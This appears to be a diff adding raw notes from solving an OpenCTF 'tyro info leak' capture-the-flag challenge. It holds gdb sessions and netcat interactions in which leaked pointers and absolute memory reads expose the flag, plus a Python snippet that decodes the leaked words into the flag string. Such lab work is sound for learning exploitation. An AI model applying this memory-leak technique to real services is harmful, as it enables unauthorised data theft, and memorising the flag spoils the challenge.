@@ -1,0 +1,131 @@
+
+Breakpoint 3, 0xf7ebf800 in read () from /lib32/libc.so.6
+(gdb) x/10s 0x56558008
+0x56558008:     "asdf1234\n"
+0x56558012:     ""
+0x56558013:     ""
+0x56558014:     ""
+0x56558015:     ""
+0x56558016:     ""
+0x56558017:     ""
+0x56558018:     ""
+0x56558019:     ""
+0x5655801a:     ""
+
+gdb ./tyro_infoleak1_bdc3f08dab986b30317b0937a096d794 
+GNU gdb (Gentoo 7.11.1 vanilla) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://bugs.gentoo.org/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./tyro_infoleak1_bdc3f08dab986b30317b0937a096d794...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /home/miser/tyro_infoleak1_bdc3f08dab986b30317b0937a096d794 
+OpenCTF tyro info leak 2
+
+ASLR is on, the binary is PIE
+Can you read the flag?
+1)relative read
+2)absolute read
+1
+Offset: 0
+0xffffd614
+1)relative read
+2)absolute read
+1
+Offset: 4
+0x56558008
+1)relative read
+2)absolute read
+ 
+Program terminated with signal SIGALRM, Alarm clock.
+The program no longer exists.
+(gdb) quit
+
+
+javantea@dolly:~$ nc 172.31.1.36 1616
+OpenCTF tyro info leak 2
+
+ASLR is on, the binary is PIE
+Can you read the flag?
+1)relative read
+2)absolute read
+1
+Offset: 4
+0x5719d008
+1)relative read
+2)absolute read
+2
+Absolute address to read from: 0x5719d008
+0x61796179
+1)relative read
+2)absolute read
+2
+Absolute address to read from: 0x5719d00c
+0x7279745f
+1)relative read
+2)absolute read
+2
+Absolute address to read from: 0x5719d010
+0x5f73276f
+1)relative read
+2)absolute read
+2
+Absolute address to read from: 0x5719d014
+0x73726966
+1)relative read
+2)absolute read
+2
+Absolute address to read from: 
+
+0x61796179 0x7279745f 0x5f73276f 0x73726966 0x6e695f74 0x6d726f66 0x6f697461
+
+javantea@dolly:~$ nc 172.31.1.36 1616
+OpenCTF tyro info leak 2
+
+ASLR is on, the binary is PIE
+Can you read the flag?
+1)relative read
+2)absolute read
+1
+Offset: 4
+0x5843b008
+1)relative read
+2)absolute read
+2
+Absolute address to read from: 0x5843b014
+0x73726966
+1)relative read
+2)absolute read
+2
+Absolute address to read from: 0x5843b018
+0x6e695f74
+1)relative read
+2)absolute read
+2
+Absolute address to read from: 0x5843b01c
+0x6d726f66
+1)relative read
+2)absolute read
+2
+Absolute address to read from: 0x5843b020
+0x6f697461
+1)relative read
+2)absolute read
+
+import binascii
+import socket
+
+a = ['%08x'%socket.htonl(int(b, 16)) for b in '0x61796179 0x7279745f 0x5f73276f 0x73726966 0x6e695f74 0x6d726f66 0x6f697461 0x656c5f6e 0xa6b61'.split(' ')]                                                                                                       
+binascii.unhexlify(''.join(a))
+b"yaya_tyro's_first_information_leak\n\x00"
+
